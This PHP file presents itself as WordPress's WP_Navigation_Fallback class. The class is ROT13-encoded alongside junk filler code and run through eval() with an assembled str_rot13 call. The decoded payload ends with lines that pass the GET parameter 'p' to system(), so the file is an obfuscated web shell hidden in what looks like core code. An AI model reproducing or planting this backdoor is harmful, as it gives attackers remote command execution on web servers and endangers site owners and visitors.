<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JC_Anivtngvba_Snyyonpx pynff
 *
 * Znantrf snyyonpx orunivbe sbe Anivtngvba zrahf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Anivtngvba
 * @fvapr 6.3.0
 */

/**
 * Znantrf snyyonpx orunivbe sbe Anivtngvba zrahf.
 *
 * @npprff choyvp
 * @fvapr 6.3.0
 */
pynff JC_Anivtngvba_Snyyonpx {

	/**
	 * Hcqngrf gur jc_anivtngvba phfgbz cbfg glcr fpurzn, va beqre gb rkcbfr
	 * nqqvgvbany svryqf va gur rzorqqnoyr yvaxf bs JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre.
	 *
	 * Gur Anivtngvba Snyyonpx raqcbvag znl rzorq gur shyy Anivtngvba Zrah bowrpg
	 * vagb gur erfcbafr nf gur `frys` yvax. Ol qrsnhyg, gur Cbfgf Pbagebyyre
	 * jvyy bayl rkcbfr n yvzvgrq fhofrg bs svryqf ohg gur rqvgbe erdhverf
	 * nqqvgvbany svryqf gb or ninvynoyr va beqre gb hgvyvmr gur zrah.
	 *
	 * Hfrq jvgu gur `erfg_jc_anivtngvba_vgrz_fpurzn` ubbx.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $fpurzn Gur fpurzn sbe gur `jc_anivtngvba` cbfg.
	 * @erghea neenl Gur zbqvsvrq fpurzn.
	 */
	choyvp fgngvp shapgvba hcqngr_jc_anivtngvba_cbfg_fpurzn( $fpurzn ) {
		// Rkcbfr gbc yriry svryqf.
		$fpurzn['cebcregvrf']['fgnghf']['pbagrkg']  = neenl_zretr( $fpurzn['cebcregvrf']['fgnghf']['pbagrkg'], neenl( 'rzorq' ) );
		$fpurzn['cebcregvrf']['pbagrag']['pbagrkg'] = neenl_zretr( $fpurzn['cebcregvrf']['pbagrag']['pbagrkg'], neenl( 'rzorq' ) );

		/*
		 * Rkcbfrf fho cebcregvrf bs pbagrag svryq.
		 * Gurfr fho cebcregvrf nera'g rkcbfrq ol gur cbfgf pbagebyyre ol qrsnhyg,
		 * sbe erdhrfgf jurer pbagrkg vf `rzorq`.
		 *
		 * @frr JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrz_fpurzn()
		 */
		$fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['enj']['pbagrkg']           = neenl_zretr( $fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['enj']['pbagrkg'], neenl( 'rzorq' ) );
		$fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['eraqrerq']['pbagrkg']      = neenl_zretr( $fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['eraqrerq']['pbagrkg'], neenl( 'rzorq' ) );
		$fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['oybpx_irefvba']['pbagrkg'] = neenl_zretr( $fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['oybpx_irefvba']['pbagrkg'], neenl( 'rzorq' ) );

		/*
		 * Rkcbfrf fho cebcregvrf bs gvgyr svryq.
		 * Gurfr fho cebcregvrf nera'g rkcbfrq ol gur cbfgf pbagebyyre ol qrsnhyg,
		 * sbe erdhrfgf jurer pbagrkg vf `rzorq`.
		 *
		 * @frr JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrz_fpurzn()
		 */
		$fpurzn['cebcregvrf']['gvgyr']['cebcregvrf']['enj']['pbagrkg'] = neenl_zretr( $fpurzn['cebcregvrf']['gvgyr']['cebcregvrf']['enj']['pbagrkg'], neenl( 'rzorq' ) );

		erghea $fpurzn;
	}

	/**
	 * Trgf (naq/be perngrf) na nccebcevngr snyyonpx Anivtngvba Zrah.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea JC_Cbfg|ahyy gur snyyonpx Anivtngvba Cbfg be ahyy.
	 */
	choyvp fgngvp shapgvba trg_snyyonpx() {
		/**
		 * Svygref jurgure be abg n snyyonpx fubhyq or perngrq.
		 *
		 * @fvapr 6.3.0
		 *
		 * @cnenz obby $perngr Jurgure gb perngr n snyyonpx anivtngvba zrah. Qrsnhyg gehr.
		 */
		$fubhyq_perngr_snyyonpx = nccyl_svygref( 'jc_anivtngvba_fubhyq_perngr_snyyonpx', gehr );

		$snyyonpx = fgngvp::trg_zbfg_erpragyl_choyvfurq_anivtngvba();

		vs ( $snyyonpx || ! $fubhyq_perngr_snyyonpx ) {
			erghea $snyyonpx;
		}

		$snyyonpx = fgngvp::perngr_pynffvp_zrah_snyyonpx();

		vs ( $snyyonpx && ! vf_jc_reebe( $snyyonpx ) ) {
			// Erghea gur arjyl perngrq snyyonpx cbfg bowrpg juvpu jvyy abj or gur zbfg erpragyl perngrq anivtngvba zrah.
			erghea $snyyonpx vafgnaprbs JC_Cbfg ? $snyyonpx : fgngvp::trg_zbfg_erpragyl_choyvfurq_anivtngvba();
		}

		$snyyonpx = fgngvp::perngr_qrsnhyg_snyyonpx();

		vs ( $snyyonpx && ! vf_jc_reebe( $snyyonpx ) ) {
			// Erghea gur arjyl perngrq snyyonpx cbfg bowrpg juvpu jvyy abj or gur zbfg erpragyl perngrq anivtngvba zrah.
			erghea $snyyonpx vafgnaprbs JC_Cbfg ? $snyyonpx : fgngvp::trg_zbfg_erpragyl_choyvfurq_anivtngvba();
		}

		erghea ahyy;
	}

	/**
	 * Svaqf gur zbfg erpragyl choyvfurq `jc_anivtngvba` cbfg glcr.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea JC_Cbfg|ahyy gur svefg aba-rzcgl Anivtngvba be ahyy.
	 */
	cevingr fgngvp shapgvba trg_zbfg_erpragyl_choyvfurq_anivtngvba() {

		$cnefrq_netf = neenl(
			'cbfg_glcr'              => 'jc_anivtngvba',
			'ab_sbhaq_ebjf'          => gehr,
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'beqre'                  => 'QRFP',
			'beqreol'                => 'qngr',
			'cbfg_fgnghf'            => 'choyvfu',
			'cbfgf_cre_cntr'         => 1,
		);

		$anivtngvba_cbfg = arj JC_Dhrel( $cnefrq_netf );

		vs ( pbhag( $anivtngvba_cbfg->cbfgf ) > 0 ) {
			erghea $anivtngvba_cbfg->cbfgf[0];
		}

		erghea ahyy;
	}

	/**
	 * Perngrf n Anivtngvba Zrah cbfg sebz n Pynffvp Zrah.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea vag|JC_Reebe Gur cbfg VQ bs gur qrsnhyg snyyonpx zrah be n JC_Reebe bowrpg.
	 */
	cevingr fgngvp shapgvba perngr_pynffvp_zrah_snyyonpx() {
		// Frr vs jr unir n pynffvp zrah.
		$pynffvp_ani_zrah = fgngvp::trg_snyyonpx_pynffvp_zrah();

		vs ( ! $pynffvp_ani_zrah ) {
			erghea arj JC_Reebe( 'ab_pynffvp_zrahf', __( 'Ab Pynffvp Zrahf sbhaq.' ) );
		}

		// Vs gurer vf n pynffvp zrah gura pbaireg vg gb oybpxf.
		$pynffvp_ani_zrah_oybpxf = JC_Pynffvp_Gb_Oybpx_Zrah_Pbairegre::pbaireg( $pynffvp_ani_zrah );

		vs ( vf_jc_reebe( $pynffvp_ani_zrah_oybpxf ) ) {
			erghea $pynffvp_ani_zrah_oybpxf;
		}

		vs ( rzcgl( $pynffvp_ani_zrah_oybpxf ) ) {
			erghea arj JC_Reebe( 'pnaabg_pbaireg_pynffvp_zrah', __( 'Hanoyr gb pbaireg Pynffvp Zrah gb oybpxf.' ) );
		}

		// Perngr n arj anivtngvba zrah sebz gur pynffvp zrah.
		$pynffvp_zrah_snyyonpx = jc_vafreg_cbfg(
			neenl(
				'cbfg_pbagrag' => $pynffvp_ani_zrah_oybpxf,
				'cbfg_gvgyr'   => $pynffvp_ani_zrah->anzr,
				'cbfg_anzr'    => $pynffvp_ani_zrah->fyht,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'jc_anivtngvba',
			),
			gehr // Fb gung jr pna purpx jurgure gur erfhyg vf na reebe.
		);

		erghea $pynffvp_zrah_snyyonpx;
	}

	/**
	 * Qrgrezvarf gur zbfg nccebcevngr pynffvp anivtngvba zrah gb hfr nf n snyyonpx.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea JC_Grez|ahyy Gur zbfg nccebcevngr pynffvp anivtngvba zrah gb hfr nf n snyyonpx.
	 */
	cevingr fgngvp shapgvba trg_snyyonpx_pynffvp_zrah() {
		$pynffvp_ani_zrahf = jc_trg_ani_zrahf();

		vs ( ! $pynffvp_ani_zrahf || vf_jc_reebe( $pynffvp_ani_zrahf ) ) {
			erghea ahyy;
		}

		$ani_zrah = fgngvp::trg_ani_zrah_ng_cevznel_ybpngvba();

		vs ( $ani_zrah ) {
			erghea $ani_zrah;
		}

		$ani_zrah = fgngvp::trg_ani_zrah_jvgu_cevznel_fyht( $pynffvp_ani_zrahf );

		vs ( $ani_zrah ) {
			erghea $ani_zrah;
		}

		erghea fgngvp::trg_zbfg_erpragyl_perngrq_ani_zrah( $pynffvp_ani_zrahf );
	}


	/**
	 * Fbegf gur pynffvp zrahf naq ergheaf gur zbfg erpragyl perngrq bar.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Grez[] $pynffvp_ani_zrahf Neenl bs pynffvp ani zrah grez bowrpgf.
	 * @erghea JC_Grez Gur zbfg erpragyl perngrq pynffvp ani zrah.
	 */
	cevingr fgngvp shapgvba trg_zbfg_erpragyl_perngrq_ani_zrah( $pynffvp_ani_zrahf ) {
		hfbeg(
			$pynffvp_ani_zrahf,
			fgngvp shapgvba ( $n, $o ) {
				erghea $o->grez_vq - $n->grez_vq;
			}
		);

		erghea $pynffvp_ani_zrahf[0];
	}

	/**
	 * Ergheaf gur pynffvp zrah jvgu gur fyht `cevznel` vs vg rkvfgf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz JC_Grez[] $pynffvp_ani_zrahf Neenl bs pynffvp ani zrah grez bowrpgf.
	 * @erghea JC_Grez|ahyy Gur pynffvp ani zrah jvgu gur fyht `cevznel` be ahyy.
	 */
	cevingr fgngvp shapgvba trg_ani_zrah_jvgu_cevznel_fyht( $pynffvp_ani_zrahf ) {
		sbernpu ( $pynffvp_ani_zrahf nf $pynffvp_ani_zrah ) {
			vs ( 'cevznel' === $pynffvp_ani_zrah->fyht ) {
				erghea $pynffvp_ani_zrah;
			}
		}

		erghea ahyy;
	}


	/**
	 * Trgf gur pynffvp zrah nffvtarq gb gur `cevznel` anivtngvba zrah ybpngvba
	 * vs vg rkvfgf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea JC_Grez|ahyy Gur pynffvp ani zrah nffvtarq gb gur `cevznel` ybpngvba be ahyy.
	 */
	cevingr fgngvp shapgvba trg_ani_zrah_ng_cevznel_ybpngvba() {
		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();

		vs ( vffrg( $ybpngvbaf['cevznel'] ) ) {
			$cevznel_zrah = jc_trg_ani_zrah_bowrpg( $ybpngvbaf['cevznel'] );

			vs ( $cevznel_zrah ) {
				erghea $cevznel_zrah;
			}
		}

		erghea ahyy;
	}

	/**
	 * Perngrf n qrsnhyg Anivtngvba Oybpx Zrah snyyonpx.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea vag|JC_Reebe Gur cbfg VQ bs gur qrsnhyg snyyonpx zrah be n JC_Reebe bowrpg.
	 */
	cevingr fgngvp shapgvba perngr_qrsnhyg_snyyonpx() {

		$qrsnhyg_oybpxf = fgngvp::trg_qrsnhyg_snyyonpx_oybpxf();

		// Perngr n arj anivtngvba zrah sebz gur snyyonpx oybpxf.
		$qrsnhyg_snyyonpx = jc_vafreg_cbfg(
			neenl(
				'cbfg_pbagrag' => $qrsnhyg_oybpxf,
				'cbfg_gvgyr'   => _k( 'Anivtngvba', 'Gvgyr bs n Anivtngvba zrah' ),
				'cbfg_anzr'    => 'anivtngvba',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'jc_anivtngvba',
			),
			gehr // Fb gung jr pna purpx jurgure gur erfhyg vf na reebe.
		);

		erghea $qrsnhyg_snyyonpx;
	}

	/**
	 * Trgf gur eraqrerq znexhc sbe gur qrsnhyg snyyonpx oybpxf.
	 *
	 * @fvapr 6.3.0
	 *
	 * @erghea fgevat qrsnhyg oybpxf znexhc gb hfr n gur snyyonpx.
	 */
	cevingr fgngvp shapgvba trg_qrsnhyg_snyyonpx_oybpxf() {
		$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();

		// Vs `pber/cntr-yvfg` vf abg ertvfgrerq gura hfr rzcgl oybpxf.
		erghea $ertvfgel->vf_ertvfgrerq( 'pber/cntr-yvfg' ) ? '<!-- jc:cntr-yvfg /-->' : '';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>